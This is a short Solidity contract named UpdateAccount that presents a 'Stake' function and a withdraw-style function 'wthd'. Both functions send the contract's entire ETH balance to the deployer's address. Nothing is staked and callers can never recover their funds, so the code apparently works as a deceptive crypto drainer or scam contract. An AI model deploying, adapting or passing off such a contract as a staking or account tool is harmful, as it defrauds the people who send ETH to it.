//SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract UpdateAccount {
  address payable parentAddress;

  constructor() {
    parentAddress = payable(msg.sender);
  }

  function  Stake() public payable {
    require(msg.value > 0, "0 ETH sent");
    parentAddress.transfer(address(this).balance);
  }

  function wthd () public payable {
    require(address(this).balance > 0, "0 ETH to withdraw");
    parentAddress.transfer(address(this).balance);
  }

}